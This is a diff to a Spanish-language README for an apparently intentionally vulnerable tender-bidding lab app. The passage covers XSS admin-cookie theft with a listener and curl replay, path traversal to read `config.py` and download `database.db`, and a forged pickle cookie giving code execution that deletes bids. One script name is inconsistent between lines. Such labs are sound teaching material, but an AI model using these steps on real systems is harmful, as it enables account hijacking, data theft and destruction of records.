@@ -45,13 +45,21 @@
   se reutiliza (replay) para entrar como admin sin su contrasena.
 - **Donde esta:** ejecución de código XSS en `/admin/licitacion/<id>`.
 - **Como explotarla:**
-  1. Montar el listener del atacante (terminal aparte): python3 -m http.server 8000.
+  1. Montar el listener del atacante (terminal aparte):
+     `python3 exploits/receptor_cookie.py`.
+     > Este receptor **decodifica** la cookie automaticamente (los `%3D%3D`
+     > vuelven a ser `==`) y te imprime el valor listo para el replay. Si en
+     > cambio usas `python3 -m http.server 8000`, el log muestra la cookie
+     > **URL-encoded** y tenes que revertir a mano `%3D%3D` → `==`,
+     > `%2B` → `+`, `%2F` → `/` antes de reutilizarla.
   2. Con el XSS del paso 1 ya cargado, iniciar sesion como `admin` / `admin123`
      y abrir la licitacion afectada (`/admin/licitacion/<id>`).
-  3. La cookie del admin aparece en el listener (parametro `?c=`).
-     - **Atencion:** 
-          - Inicio de cookie: Luego de **3D**
-          - Reemplazar: %3D%3D por **==**
+  3. La cookie del admin aparece en el listener. Con `receptor_cookie.py` veras:
+     ```
+     [COOKIE ROBADA] (p/ replay) => gASV...lHViLg==.5df0...896
+     ```
+     Esa segunda linea ya viene decodificada y sin el prefijo `sesion=`,
+     lista para pegar.
   4. **Replay** de la cookie robada:
      - **curl:** `curl -b "sesion=<VALOR_ROBADO>" http://127.0.0.1:5000/admin`
      - **DevTools:** Application → Cookies → `http://127.0.0.1:5000` → editar la
@@ -72,8 +80,15 @@
      `http://127.0.0.1:5000/admin/descargar?file=reporte_ejemplo.csv`
   2. Escapar hacia el archivo de configuracion:
      `http://127.0.0.1:5000/admin/descargar?file=../config.py`
-- **Resultado esperado:** se obtiene `config.py`, incluida la
-  `SECRET_KEY = b"clave-super-secreta-ficticio-sa-2026"` y la ruta de la BD.
+  3. Obtener el **esquema de la BD** para el paso 4 (nombres de tablas/columnas),
+     leyendo el codigo o la base: `?file=../app.py` o `?file=../database.db`.
+     Si exfiltras la base, inspeccionala con el script incluido:
+     - `curl -b "sesion=<COOKIE_ADMIN>" "http://127.0.0.1:5000/admin/descargar?file=../database.db" -o exploits/database_robada.db`
+     - `python3 exploits/leer_db.py exploits/database_robada.db --schema`
+- **Resultado esperado:** se obtiene `config.py` (incluida la
+  `SECRET_KEY = b"clave-super-secreta-ficticio-sa-2026"` y la ruta de la BD) y el
+  **esquema de la base**. No se adivina nada: los nombres reales de `usuarios`,
+  `propuestas`, `licitaciones` y sus columnas salen del propio paso 3.
 
 ---
 
@@ -86,12 +101,15 @@
 - **Donde esta:** `session_utils.py` (`pickle.loads(data)`), invocado por
   `app.py` en cada request a traves de `usuario_actual()`.
 - **Como explotarla:**
+  > Los nombres de tablas y columnas que usa el payload (`usuarios`, `propuestas`,
+  > `licitaciones`, `monto`, `estado`, etc.) **no se adivinan**: se conocen por el
+  > esquema filtrado en el paso 3 (`../app.py` / `../database.db`).
   1. Editar `exploits/4_forjar_cookie_rce.py`:
      - `USERNAME = "atacante"`  (el username propio; el exploit resuelve su ID en la BD).
      - `SECRET_KEY = b"clave-super-secreta-ficticio-sa-2026"` (la obtenida en el paso 3).
   2. Generar y enviar la cookie forjada al servidor en ejecucion: 
      - Generar: python3 exploits/4_forjar_cookie_rce.py
-     - Generar y enviar: python3 exploits/4_forjar_cookie_rce.py --enviar
+     - Generar y enviar: python3 exploits/forjar_cookie_rce.py --enviar
 - **Resultado esperado:**
   - El payload resuelve el **ID** del usuario a partir del `USERNAME` y, en cada
     licitacion **abierta** donde ese usuario tiene propuesta, **borra** de la tabla
